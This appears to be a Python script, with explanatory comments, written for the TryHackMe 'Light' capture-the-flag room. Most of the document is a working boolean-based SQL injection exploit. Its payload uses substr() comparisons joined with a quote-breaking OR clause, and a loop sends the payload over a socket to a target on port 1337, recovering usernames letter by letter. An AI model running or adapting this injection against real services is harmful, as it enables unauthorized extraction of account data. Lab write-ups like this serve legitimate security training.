# this script enumerates the usernames of the TryHackMe Light room database
# there are other, and much better, ways to bypass the SQL security in that room, but the assumption here is:
#   - you only get a boolean response for each query

# the payload:
#   ' OR (substr(username,{letter_position},1)='{letter}') and '1'='1"
# this will return a successful response when it matches the correct letter in the correct place for a username
# for example:
#   - for "smokey" it will return successfully for "m" in the 2nd position
#   - for usernames with the same letter in the same position, only one will have priority, and the other is padded with "*"
#   - if the last letter of a username loses priority to another username, it won't be recognized (see name "*tev" for user steve below)

# example output
#=== Usernames ===
#Password: *************** -> Username: alice
#Password: *************** -> Username: hazel
#Password: *************** -> Username: j*hn
#Password: *************** -> Username: michael
#Password: *************** -> Username: rob
#Password: *************** -> Username: smok*y
#Password: *************** -> Username: *tev
#Password: *************** -> Username: **lph

import socket
import sys
import time
import string

HOST = "TARGET_IP"
PORT = 1337

charset = string.ascii_lowercase # + string.ascii_uppercase + string.digits + "!@#$%^&*()-_+=[]{};:'\",.<>?/|"
usernames = {}

# connect
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
print(f"Connected to {HOST}:{PORT}")

# read initial response
data = s.recv(1024)
print(data.decode("utf-8"))
time.sleep(0.5)

# empty buffer (otherwise the first query response might mess up)
s.setblocking(False)
try:
    while True:
        junk = s.recv(1024)
        if not junk:
            break
except BlockingIOError:
    pass
s.setblocking(True)

# adjust length of usernames (for testing just start with a few letters)
max_length = 10

for pos in range(1, max_length + 1): # letter position in username
    for letter in charset:
        payload = f"' OR (substr(username,{pos},1)='{letter}') and '1'='1\n"
        print(f"PAYLOAD: {payload.strip()}")  # Debugging
        
        # send payload
        s.sendall(payload.encode("utf-8"))
        time.sleep(0.1)  # allow some time to pass for the server to catch up

        # receive response
        data = s.recv(1024)
        if not data:
            print("Connection closed by host")
            sys.exit(0)

        decoded = data.decode("utf-8").strip()
        #print(f"Received: {decoded}") # debugging

        # check for successful response
        if decoded.startswith("Password"):
            passwd = decoded.split("\n")[0] # extract first line (which contains password)

            # add the entry to the dictionary if it doesn't exist
            if passwd not in usernames:
                usernames[passwd] = ""

            # pad with "*" until length matches
            while len(usernames[passwd]) < pos - 1:
                usernames[passwd] += "*"

            usernames[passwd] += letter  # append letter to name

# disconnect
s.close()

# print enumerated names
print("\n=== Usernames ===")
for password, username in usernames.items():
    print(f"{password} -> Username: {username}")
